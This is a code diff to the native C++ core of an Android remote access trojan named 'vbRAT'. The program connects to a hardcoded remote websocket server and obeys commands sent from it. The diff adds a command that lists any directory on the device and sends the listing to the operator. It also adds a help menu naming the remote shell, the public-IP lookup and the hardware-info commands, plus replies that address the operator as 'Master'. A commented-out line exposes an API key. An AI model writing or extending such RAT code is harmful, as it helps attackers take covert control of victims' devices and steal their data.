@@ -7,13 +7,29 @@
 #include <pthread.h>
 #include <list>
 #include <string>
+#include <dirent.h>
 #include "vbConnection.h"
 #include "vbDeviceProperties.h"
 #include "vbTTY.h"
+#include "vbRAT.h"
+#include "common.h"
+
+typedef struct
+{
+    bool tips;
+} vbrat_t;
+
+vbrat_t vbRAT;
 
 using namespace std;
 //#define SERVER_ADDR "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi"
 #define SERVER_ADDR "wss://vbrat-server.herokuapp.com/zio"
+
+void _printTip(const char *msg)
+{
+    if(vbRAT.tips)
+        vbConnection_Send(msg);
+}
 
 void ttyread(char *msg)
 {
@@ -22,8 +38,8 @@ void ttyread(char *msg)
 
 void vbRAT_connected()
 {
-    vbConnection_Send("~New device connected!");
-    vbConnection_Send("~listening to your commands...");
+    vbConnection_Send("~Greetings my master");
+    vbConnection_Send("~I'm listening to your commands...");
 }
 
 void vbRAT_disconnected()
@@ -39,14 +55,27 @@ void vbRAT_messageReceived(const char* buf, int len)
     if(vbTTY_isOpen())
     {
         if(strcmp(buf, ";shellstop")==0)
+        {
             vbTTY_stopShell();
+            vbConnection_Send("~Terminal session closed.");
+        }
         else
             vbTTY_send(buf);
+    }
+    else if(strcmp(buf, ";shellstop")==0)
+    {
+        vbConnection_Send("~You're not into a terminal session :(");
     }
     else if(strcmp(buf, ";shellstart")==0)
     {
         if(!vbTTY_isOpen())
-            vbTTY_startShell(ttyread);
+        {
+            if(vbTTY_startShell(ttyread))
+                vbConnection_Send("~Apologies Master, I cannot open a terminal session");
+            else
+                vbConnection_Send("~Your terminal session is open.");
+
+        }
     }
     else if(strstr(buf, ";ip="))
     {
@@ -89,14 +118,49 @@ void vbRAT_messageReceived(const char* buf, int len)
             it2++;
         }
     }
-    //else
-    //    vbConnection_Send("~sorry, unknown command.");
+    else if(strstr(buf, ";scandir "))
+    {
+        char tosend[1024];
+        char targetdir[512];
+        snprintf(targetdir, 512, "%s", &buf[9]);
+        struct dirent **fileListTemp;
+        int nof = scandir(targetdir, &fileListTemp, NULL, alphasort);
+        if (nof < 0)
+            vbConnection_Send("access denied");
+        else
+        {
+            snprintf(tosend, 1024, "~ls %s", targetdir);
+            vbConnection_Send(tosend);
+            for (int i = 0; i < nof; i++)
+            {
+                //snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
+                snprintf(tosend, 1024, "%s - %d", fileListTemp[i]->d_name, fileListTemp[i]->d_type);
+                vbConnection_Send(tosend);
+            }
+        }
+    }
+    else if(strcmp(buf, ";help")==0) //
+    {
+        char tosend[1024];
+        snprintf(tosend, 1024, "%s", "Master, this are all the commands I know: \n");
+        strcat(tosend, ";shellstart [turns this into a terminal emulator on device] \n");
+        strcat(tosend, ";shellstop [disconnect from the terminal emulator] \n");
+        strcat(tosend, ";>C [in terminal mode sends ETX (CTRL+C)] \n");
+        strcat(tosend, ";getip [returns informations about the device public IP and its network interfaces]\n");
+        strcat(tosend, ";getinfo [prints generic HW info about thre device (Brand, model, etc..)] \n");
+        strcat(tosend, ";help [prints this help] \n");
+        vbConnection_Send(tosend);
+    }
+    else
+        vbConnection_Send("~Unknown command, how can I ;help you?");
 
 }
 
 extern "C" JNIEXPORT jint JNICALL
 Java_com_example_vbrat_MainActivity_vbRATstart(JNIEnv *env, jobject MainActivity)
 {
+    LOGW("Started..");
+    vbRAT.tips = true;
     vbConnection_onConnected(vbRAT_connected);
     vbConnection_onDisconnected(vbRAT_disconnected);
     vbConnection_onMessage(vbRAT_messageReceived);
